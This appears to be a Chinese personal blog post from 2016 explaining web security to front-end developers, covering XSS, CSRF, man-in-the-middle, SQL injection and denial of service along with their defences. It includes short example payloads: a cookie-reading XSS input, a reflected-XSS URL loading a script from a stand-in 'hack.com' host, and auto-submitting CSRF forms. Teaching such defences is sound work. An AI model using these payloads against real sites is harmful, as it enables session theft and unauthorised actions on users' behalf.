@@ -1,0 +1,112 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 我所理解的 Web 安全 · 易浮的小窝</title><meta name="description" content="我所理解的 Web 安全 - Hyifu"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://github.com/Hyifu/atom.xml" title="易浮的小窝"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"><h1>易浮的小窝</h1></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">我所理解的 Web 安全</h1><div class="post-info">Dec 5, 2016</div><div class="post-content"><p>最近完成了一个关于店铺的评论插件，由于插件的特殊性质（见下图），在开发的过程中，或多或少地接触到了一些必要的安全防御手段。本来我对 web 的安全其实没有太多的研究，不过随着第二期迭代的完成，也确实意识到了自己在这方面的薄弱部分。好在项目有相当有经验的同事担当，因此开发中确实学到了很多，记录一下前端实际开发中遇到的安全问题和我个人的理解<br><img src="/images/我所理解的web安全-评价插件.png" alt="我所理解的web安全-评价插件"></p>
+<a id="more"></a>
+<h2 id="为什么不安全"><a href="#为什么不安全" class="headerlink" title="为什么不安全"></a>为什么不安全</h2><p>web 作为互联网的最佳载体，在这几年我们见证了它迅速发展，JavaScript 在几年间成为最热门的语言，作为 Web 开发的最直接与用户打交道的一环，前端开发工程师的地位日益提高，责任也越来越大，安全问题就是其中的一个点。</p>
+<p>在 Sass 建站服务中我们一直重视安全，比如前面头图中的插件就有许多可以自定义的代码，这里需要注意防止 XSS 注入，不过其他大部分防御措施还是基于服务端，比如 DDos 防御系统，信息逻辑全部在后端验证，授权体系等等，这导致有些前端开发者同事们甚至都不知道什么是 XSS 攻击（比如说半年前的我）。但是，前端对于攻击的防范，一定是建立在了解对手进行攻击的方式的基础上的。</p>
+<p>我们讨论安全，是因为不是所有的用户都是可信赖的，网络世界跟现实世界一样，总有恶意分子在时刻窥视着。尤其是对于电商而言，因为涉及到金钱的交易，其安全问题造成的影响应该比普通的博客，论坛更加严重。</p>
+<p>我们也知道，没有绝对安全的东西，即便是微软、谷歌这样的超级公司，也难免存在一些漏洞。我们所说的安全是指，在可承受的风险范围内是安全的，这就好比建一栋楼，它可以抵抗 12 级大风的攻击，但也绝对不可能抵抗一个战略导弹的直接命中，因为被导弹攻击的概率及其地微小，而做到这种防御所需要的成本及其昂贵。因此所有的安全措施都是风险和成本中间的一个权衡。</p>
+<p>实际的软件开发中，我们一般只需要做到常规的安全防范就足以应付 99% 以上的攻击了，与安全防范一样，攻击也是一个成本与收益的权衡，没见过攻击者花费几个月的时间，只为了得到一个普通账户的下单记录。这就是我对安全的理解，知己知彼，了解常规攻击及其防范是第一件要做的事</p>
+<blockquote>
+<p>《白帽子讲 Web 安全》这本书的第一章，“我的安全世界观”中提到：<strong>安全问题的本质是信任问题</strong>，这本书真心浅显易懂又深入问题的根本，推荐至少阅读一遍，尤其是讨论浏览器安全的第二部分，讲述了许多令人惊叹的攻击方式，对前端安全的认识甚是有帮助</p>
+</blockquote>
+<h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><p>Cross Site Scripting 简称 XSS（简写区分了层叠样式表），是最最最常见的基础攻击手段。一般是指通过“HTML”注入的方式在网页插入恶意的脚本，控制用户的浏览器行为，是 Web 安全的头号大敌。在我参与的项目中，由于客户可自定义的需求存在，因此用户输入和自定义代码随处可见（比如 B 端主题系统中的自定义模块样式，C 端的用户信息完善），因此对跨站脚本防御是非常重要对一个地方。下面是 XSS 的基础展示<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"$&#123;name&#125;"</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这里定义了一个输入框，用户可以直接修改自己的用户名 <code>${name}</code>，服务器保存提交并直接输出到页面中，那么假设用户并不是常规地输入用户名，而是输入了这样的代码：<br><code>&quot; onfocus=&quot;alert(document.cookie)</code><br>那么最终输出的页面将变成这样<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onfocus</span>=<span class="string">"alert(document.cookie)"</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这一次输入框获得焦点的时候，页面弹出了 cookie 信息，这显然并不是开发者希望出现的状况，这就是 XSS 攻击的基本原理。</p>
+<blockquote>
+<p><a href="https://www.w3.org/TR/CSP/" target="_blank" rel="external">Content Security Policy</a>（CSP，内容安全策略）是对跨站脚本对一个强大的防范机制，Chrome 内建对 App 应用强制使用这一策略，但是由于其限制颇多，规则复杂，开发者维护也比较艰难，尚未得到大面积的普及</p>
+</blockquote>
+<p>XSS 根据攻击的方式可分为两种：</p>
+<ul>
+<li>反射型 XSS</li>
+<li>存储型 XSS</li>
+</ul>
+<blockquote>
+<p>普遍认为还有一种攻击方式是 DOM based 类型，但其实我个人认为它依然是基于反射触发的一种，只是实现的方式比较特殊而已。另外，考虑 XSS 攻击的方式有很多变种，因此只考虑主流的两种分类：依据其是否需要用户交互</p>
+</blockquote>
+<h4 id="反射型-XSS（非持久型-XSS）"><a href="#反射型-XSS（非持久型-XSS）" class="headerlink" title="反射型 XSS（非持久型 XSS）"></a>反射型 XSS（非持久型 XSS）</h4><blockquote>
+<p>一般只是把用户的输入“反射”给浏览器，通常通过诱导用户“访问”一个恶意链接，因为通常是一次性的，因此又叫做非持久性 XSS</p>
+</blockquote>
+<p>比如友好速搭的文档中心中，具备一个搜索功能，当服务器没有找到搜索关键词时会直接显示该内容不存在，如下图：<br><img src="/images/我所理解的web安全-XSS-1.png" alt="我所理解的web安全-XSS-1"></p>
+<p>点击查看 <a href="https://docs.youhaosuda.com/search?q=XSS" target="_blank" rel="external">没有搜索到与“XSS”相关的内容</a></p>
+<p>我们观察发现它是基于 URL 查询字符串来进行检索的（这样方便开发者们定位文档），假设我们的后台是直接输出这个查询字符串，就会存在一个 XSS 漏洞，考虑以下 URL：<br><code>https://docs.youhaosuda.com/search?q=&lt;script src=&quot;hack.com/evil.js&quot;&gt;</code></p>
+<p>查询字符串中附加了一个脚本 <code>&lt;script src=&quot;hack.com/evil.js&quot;&gt;</code>，这会导致页面直接潜入了一个恶意脚本（因为一定查不到对应的文档），这个脚本执行后可能会偷取用户（用户极有可能已经登录）的敏感信息，然后通过图像ping等跨域方式发送到攻击者到服务器</p>
+<h4 id="存储型-XSS（持久型-XSS）"><a href="#存储型-XSS（持久型-XSS）" class="headerlink" title="存储型 XSS（持久型 XSS）"></a>存储型 XSS（持久型 XSS）</h4><blockquote>
+<p>一般将恶意代码存储在服务器，所有访问该页面的用户都将遭到攻击，具有更好的稳定性和持续性，可以威胁大量的用户，因此又叫做持久性 XSS</p>
+</blockquote>
+<p>这种攻击最常见于博客论坛这类通过文章／帖子可以获得大量流量到地方，假如攻击者发现了知乎专栏存在一个 XSS 漏洞，在发表文章时通过巧妙到方法绕过限制从而内嵌一个恶意脚本，于是读者阅读完这篇文章时，恶意脚本已经在背后完成指定操作（如自动关注某人，点赞，转发等，因此传播速度非常快）</p>
+<h4 id="XSS-防御手段"><a href="#XSS-防御手段" class="headerlink" title="XSS 防御手段"></a>XSS 防御手段</h4><p>前面提到了 XSS 的原理和攻击方式，那么作为开发者更应该关心的是如何避免 XSS 漏洞；虽然现在的浏览器对于 XSS 的防护（尤其对反射型 XSS）提供了各种过滤器，但是开发者必须考虑到最糟糕的时候。一般有以下方式进行防范：</p>
+<ul>
+<li><p>输入转义</p>
+<blockquote>
+<p>转义一般前后端都需要做，但由于前端可以被绕过，因此后端才是主力。需要 HTML Encode 的内容一般包括尖括号，敏感标签及特殊字符等。</p>
+</blockquote>
+</li>
+<li><p>输入过滤</p>
+<blockquote>
+<p>对于用户输入等内容进行校验，如填写年龄等输入框应该严格限制为 1～99 等数字。</p>
+</blockquote>
+</li>
+<li><p>限制长度</p>
+<blockquote>
+<p>如限制用户名长度不得多于20个，以此限制攻击代码等功能</p>
+</blockquote>
+</li>
+<li><p>HttpOnly</p>
+<blockquote>
+<p>这里一般是为了防止脚本获取会话 Cookie</p>
+</blockquote>
+</li>
+</ul>
+<p>对于 XSS 攻击最有效的防御手段还是进行输入输出过滤及转义，但是过滤时需要考虑到一点，攻击手段是变幻无常的，我们无法确定攻击者到底使用什么样的字符进行渗入，因此常规采用的黑名单过滤敏感词的安全性是值得怀疑的，如果需要更高的安全强度，那么应该采用更稳妥的白名单过滤。</p>
+<p>一般而言，做到前面的防范就可以避免大部分的 XSS 漏洞了，前后端的主流框架在设计时一般会考虑到安全防范，因此在开发时，尽量使用最新的框架也有利于提高安全性。对于前端开发而言，必要时可以引入专业的 XSS 防御模块进行输入校验。</p>
+<h2 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h2><p>顾名思义，CSRF 是伪装用户进行非法的操作，我们知道，HTTP 是无状态的，一般通过存活从 cookie／session 来进行身份的判断。假如我登录了一个博客，删除了其中一片文章，这个操作是使用一个 GET 请求进行的：<br><code>http://hyifu.com/delete?pageid=001</code></p>
+<p>我们注意到，<code>delete?pageid=001</code> 代表着删除 <code>id</code> 为 <code>001</code> 的文章，那么如果希望删除 <code>id</code> 为 <code>002</code> 的文章，我其实直接打开一个标签页输入 <code>http://hyifu.com/delete?pageid=002</code> 就可以做到：因为这个时候服务器认为这是同一个人在进行正常的操作（因为 session cookie 一致）。</p>
+<p>考虑这个规则被我的死对头知道了，他用 QQ 发了一个链接给我，这个链接打开的页面主要内容如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>你的文章太烂了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">"display:none"</span> <span class="attr">src</span>=<span class="string">"http://hyifu.com/delete?pageid=003"</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>会发生什么样的事情呢？我打开这个链接发现这只是一个无聊的笑话，可事实是我关掉这个页面回到我自己的博客却发现第三篇文章不见了！这就是 CSRF，伪装了我的身份进行了非法的操作。</p>
+<blockquote>
+<p>前面这个例子并不总是能成功，因为有些浏览器会在 img 等可以跨域的标签的请求中会禁止携带认证 cookie，但这只是一种攻击方式，可能的攻击方式还很多，比如直接诱导点击链接</p>
+</blockquote>
+<p>你可能认为，这是基于 GET 操作进行的攻击而已，我把敏感的操作都用 POST 请求进行就可以了，但实际上，刚才那个页面也许是这样的：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>你的文章太烂了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://hyifu.com/delete"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"pageid"</span> <span class="attr">value</span>=<span class="string">"003"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">document</span>.forms[<span class="number">0</span>].submit()</div><div class="line">  &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>GET 和 POST 的安全性，在大部分情况下是一样的，攻击者一般不会在意是不是直接在 url 中附带参数，我们的防御措施应该不是基于这个点，而是关注其本质：伪装！是的，我们注意到，攻击能够成功的很大一部分原因就是攻击者知道我们的参数是如何提交上去的。应对措施的实现思路也是基于此展开：</p>
+<ol>
+<li><p>既然你需要伪造请求，那么设计一个很难猜的请求就好了：使用随机性的请求入口</p>
+<blockquote>
+<p><code>http://hyifu.com/delete</code> 与 <code>http://hyifu.com/3c8d9po8</code> 比较，攻击者显然更容易猜到前者，但如此随机的 API 可不利于后端接口的统一，因此需要更好的方法</p>
+</blockquote>
+</li>
+<li><p>考虑攻击的时候用户不知情，那么我的请求必须附带一个参数：操作验证码</p>
+<blockquote>
+<p>大部分的网站的核心操作都会带有验证码，更严格的如手机验证码和邮件验证码，但是如果简单的操作也要使用验证码，用户体验会大打折扣</p>
+</blockquote>
+</li>
+<li><p>攻击的时候，一般都是在攻击者设计的页面访问目标页面，那么请求带上 <code>Referer</code>?</p>
+<blockquote>
+<p>这是一条很好的方法，如果所有访问都足以提供准确的 <code>Referer</code>。然而由于隐私的考虑，有时 <code>Referer</code> 的发送会被限制，因此这只能是一个参考的手段</p>
+</blockquote>
+</li>
+<li><p>对了，既然请求是其他页面发生的，那么在服务器生成的 HTML 生成一个唯一的随机码，请求必须附带这个随机码</p>
+<blockquote>
+<p>这是最常用最有效的方法：Token；服务器生成一个足够随机的“密码”，这个密码同时放在 HTML 和 Cookie（Session也是可以的），每次请求必须附带这个 Token 参数，如果参数与 Cookie 一致，则认为请求来自原页面并成功，否则判断为失败</p>
+</blockquote>
+</li>
+</ol>
+<p>总结一下作为最佳实践：使用随机 Token 防止请求伪造，请求使用 POST 避免 Token 暴露，同时在关键的操作附带验证码核实是否本人（短信或邮件）</p>
+<p>应该知道，CSRF 跟 XSS 是两种完全不同的攻击方式，CSRF 的防御手段在已经被 XSS 攻击的条件下是无效的（Token 或验证码随时可以被 XSS 脚本偷取）</p>
+<h2 id="中间人攻击（Man-in-the-MiddleAttack，MITM）"><a href="#中间人攻击（Man-in-the-MiddleAttack，MITM）" class="headerlink" title="中间人攻击（Man-in-the-MiddleAttack，MITM）"></a>中间人攻击（Man-in-the-MiddleAttack，MITM）</h2><p>中间人攻击算是最常见最有效的一种攻击方式了，攻击原理非常简单：攻击者劫持了客户端和服务器之间的通讯，因此可以窃听通讯的内容，或者在通讯内容中伪装客户端或服务器进行欺骗。中间人攻击的原理比较简单，我们的应对方式一般是会话加密和身份验证，其只要实现方式是启用安全传输层协议（TLS，Transport Layer Security）</p>
+<blockquote>
+<p>但其实即使使用了 HTTPS 也还是可能遭遇劫持，比如 DNS劫持，攻击者通过 HTTP 劫持了你发送给银行的数据，攻击者自己使用 HTTPS 与银行进行正常的交互，该技术叫“SSL剥离”，当然，这对开发者而言很难避免，就需要用户及时发现了</p>
+</blockquote>
+<p>友好速搭很早就全面启用了全站 HTTPS 访问，因此在这里我主要分享一下关于 HTTPS 的必要性和原理，其实是一个很有趣的故事，生动形象地阐述了 HTTPS 诞生的背景和原理:</p>
+<blockquote>
+<p>作者：牟旭东<br>链接：<a href="https://www.zhihu.com/question/21518760/answer/19698894" target="_blank" rel="external">https://www.zhihu.com/question/21518760/answer/19698894</a><br>来源：知乎</p>
+<p>从前山上有座庙，庙里有个和尚……，别胡闹了，老和尚来了。<br>小和尚问老和尚：ssl 为什么会让 http 安全？<br>老和尚答道：譬如你我都有一个同样的密码，我发信给你时用这个密码加密，你收到我发的信，用这个密码解密，就能知道我信的内容，其他的闲杂人等，就算偷偷拿到了信，由于不知道这个密码，也只能望信兴叹，这个密码就叫做对称密码。ssl 使用对称密码对 http 内容进行加解密，所以让 http 安全了，常用的加解密算法主要有 3DES 和 AES 等。<br>小和尚摸摸脑袋问老和尚：师傅，如果我们两人选择“和尚”作为密码，再创造一个和尚算法，我们俩之间的通信不就高枕无忧了？<br>老和尚当头给了小和尚一戒尺：那我要给山下的小花写情书，还得用“和尚”这个密码不成？想了想又给了小和尚一戒尺：虽然我们是和尚，不是码农，也不能自己造轮子，当初一堆牛人码农造出了 Wifi 的安全算法 WEP，后来发现是一绣花枕头，在安全界传为笑谈；况且小花只知道 3DES 和 AES，哪知道和尚算法？<br>小和尚问到：那师傅何解？<br>老和尚：我和小花只要知道每封信的密码，就可以读到对方加密的信件，关键是我们互相之间怎么知道这个对称密码。你说，我要是将密码写封信给她，信被别人偷了，那大家不都知道我们的密码了，也就能够读懂我们情书了。不过还是有解的，这里我用到了江湖中秘传的非对称密码。我现在手头有两个密码，一个叫“公钥”，一个叫“私钥”，公钥发布到了江湖上，好多人都知道，私钥嘛，江湖上只有我一个人知道；这两个密钥有数学相关性，就是说用公钥加密的信件，可以用私钥解开，但是用公钥却解不开。公钥小花是知道的，她每次给我写信，都要我的公钥加密她的对称密码，单独写一张密码纸，然后用她的对称密码加密她的信件，这样我用我的私钥可以解出这个对称密码，再用这个对称密码来解密她的信件。<br>老和尚顿了顿：可惜她用的对称密码老是“和尚为什么写情书”这一类，所以我每次解开密码纸时总是怅然若失，其实我钟意的对称密码是诸如“风花”“雪月”什么的，最头痛的是，我还不得不用“和尚为什么写情书”这个密码来加密我给小花回的情书，人世间最痛苦的事莫过于如此。可我哪里知道，其实有人比我更痛苦。山下的张屠夫，暗恋小花很多年，看着我们鸿雁传书，心中很不是滋味，主动毛遂自荐代替香客给我们送信。在他第一次给小花送信时，就给了小花他自己的公钥，谎称是我公钥刚刚更新了，小花信以为真，之后的信件对称密码都用张屠夫的这个公钥加密了，张屠夫拿到回信后，用他自己的私钥解开了小花的对称密码，然后用这个对称密码，不仅能够看到了小花信件的所有内容，还能使用这个密码伪造小花给我写信，同时还能用他的私钥加密给小花的信件。渐渐我发现信件变味了，尽管心生疑惑，但是没有确切的证据，一次我写信问小花第一次使用的对称密码，回信中“和尚为什么写情书”赫然在列，于是我的疑惑稍稍减轻。直到有一次去拜会嵩山少林寺老方丈才顿悟，原来由于我的公钥没有火印，任何人都可以伪造一份公钥宣称是我的，这样这个人即能读到别人写给我的信，也能伪造别人给我写信，同样也能读到我的回信，也能伪造我给别人的回信，这种邪门武功江湖上称之“Man-in-the-middle attack”。唯一的破解就是使用嵩山少林寺的火印，这个火印可有讲究了，需要将我的公钥及个人在江湖地位提交给18罗汉委员会，他们会根据我的这些信息使用委员会私钥进行数字签名，签名的信息凸现在火印上，有火印的公钥真实性在江湖上无人质疑，要知道18罗汉可是无人敢得罪的。<br>小和尚问：那然后呢？<br>老和尚：从嵩山少林寺回山上寺庙时，我将有火印的公钥亲自给小花送去，可是之后再也没有收到小花的来信。过了一年才知道，其实小花还是给我写过信的，当时信确实是用有火印的公钥加密，张屠夫拿到信后，由于不知道我的私钥，解不开小花的密码信，所以一怒之下将信件全部烧毁了。也由于张屠夫无法知道小花的对称密码而无法回信，小花发出几封信后石沉大海，也心生疑惑，到处打听我的近况。这下张屠夫急了，他使用我发布的公钥，仿照小花的语气，给我发来一封信。拿到信时我就觉得奇怪，信纸上怎么有一股猪油的味道，结尾竟然还关切的询问我的私钥。情知有诈，我思量无论如何要找到办法让我知道来的信是否真是小花所写。后来竟然让我想到了办法….<br>老和尚摸着光头说：这头发可不是白掉的，我托香客给小花带话，我一切安好，希望她也拥有属于自己的一段幸福，不对，是一对非对称密钥。小花委托小镇美女协会给小花公钥打上火印后，托香客给我送来，这样小花在每次给我写信时，都会在密码纸上贴上一朵小牡丹，牡丹上写上用她自己的私钥加密过的给我的留言，这样我收到自称是小花的信后，我会先抽出密码纸，取下小牡丹，使用小花的公钥解密这段留言，如果解不出来，我会直接将整封信连同密码纸一起扔掉，因为这封信一定不是小花写的，如果能够解出来，这封信才能确信来之于小花，我才仔细的解码阅读。<br>小和尚：难怪听说张屠夫是被活活气死的。您这情书整的，我头都大了，我长大后，有想法直接扯着嗓子对山下喊，也省的这么些麻烦。不过我倒是明白了楼上的话，ssl 握手阶段，就是要解决什么看火印，读牡丹，解密码纸，确实够麻烦的，所以性能瓶颈在这里，一旦双方都知道了对称密码，之后就是行云流水的解码读信阶段了，相对轻松很多。</p>
+</blockquote>
+<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>这一部分其实主要还是要后端的同学做，不过其实这里是最常见的攻击方式了。我在开发评价插件时，由于人员的变动，前后共跟三个高级后端一起开发，在最后高级版本上线时，后端的主程透露了这么一个信息：这是他接手过的的 SQL 防注入最糟糕的项目，到处都是安全隐患（当然，这已经是过去时了）。因此在这里也稍微了解一下</p>
+<p>SQL 注入其实是针对后端服务器的 “XSS 攻击”，攻击者通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是SQL语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
+<p>至于防御方式，其实跟 XSS 防御类似，核心点在于永远不要相信用户的输入，因此在后端输入中进行转义和过滤，不动态拼接 SQL 语句<br>另外，数据库读写分离既有利于 API 的分离，也可以在一定程度上保护数据（读写操作的权限安全级别不同，对写操作进行更加严格的校验和过滤）</p>
+<h2 id="拒绝服务攻击（Dos）"><a href="#拒绝服务攻击（Dos）" class="headerlink" title="拒绝服务攻击（Dos）"></a>拒绝服务攻击（Dos）</h2><p>如果说前面的各种攻击方式需要的条件是被攻击方的后台服务器存在漏洞，那么拒绝服务攻击就真的是简单粗暴的一种方式。理解 Dos 攻击很简单，设想你开了一家饭馆，你竞争对手雇佣了一百个人堵在你饭馆门前，不让顾客进去吃饭，那么你就遭遇了一次 Dos 攻击——攻击者不断请求服务器，使得服务器不能对其他的合理请求作出反应，进而使得服务瘫痪（没有服务到目标）。这种攻击方式的进阶版本为分布式拒绝服务攻击（DDos）。</p>
+<p>在 Web 开发中，应付 DDos 最常用的两个方式是验证码和访问频率控制：<br>验证码是判断请求是真实的用户发起的还是机器人自动生成的一个有效方法，因此可以过滤掉非正常用户的操作请求，从而节省服务器资源；<br>访问频率控制是指，跟踪同一个 IP 地址的用户在特定时间段内的请求次数，将其限制在合理的范围内，对超出该范围对请求予以忽略和等候提示，甚至对于长期拥有不合理请求规模对用户 IP 进行屏蔽处理。</p>
+<p>但是现在的 DDos 攻击由于其性质的问题，实际上很难对其进行有效的判别，因此服务器抗压能力就有了很大的要求，一般使用反向代理配合分布式服务器增强集群对请求处理的能力，这也是大型互联网应用应对突发高并发请求的方法（如双十一抢购导致的合理的超大规模请求）</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实对于 Web 安全，前端方面可以做的事情并不是很多，有一段时间，知乎上关于前端到底要不要加密的讨论深深吸引了我（<a href="https://www.zhihu.com/question/25539382" target="_blank" rel="external">Web前端密码加密是否有意义？</a>）</p>
+<p>我在开发主题基础时也曾经思考过，不过由于历史原因，并没有做任何的实践，而且全站启用 HTTPS 的情况下，也确实必要性不大。但是在最近做的一个微信应用时，还是把用户密码进行了 MD5 混淆再进行传送，虽然被劫持的可能性不大（有 HTTPS），但至少被劫持了也减少了撞库的可能性。</p>
+<p>在安全方面，虽然主要还是后端做加密做数据库保护等等，但我觉得不应该把自己局限在前端开发这个位置，安全性应该是一个完整的系统，无分前后端，至少，了解主流 Web 安全防范也有利于自己视野的提升，对吧？</p>
+</div></article></div></main><footer><div class="paginator"><a href="/2017/03/08/《ECMAScript 6 入门》阅读笔记（上）/" class="prev">PREV</a><a href="/2016/11/03/从JSONP开始跨域/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2017 <a href="https://github.com/Hyifu">Hyifu</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a></p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
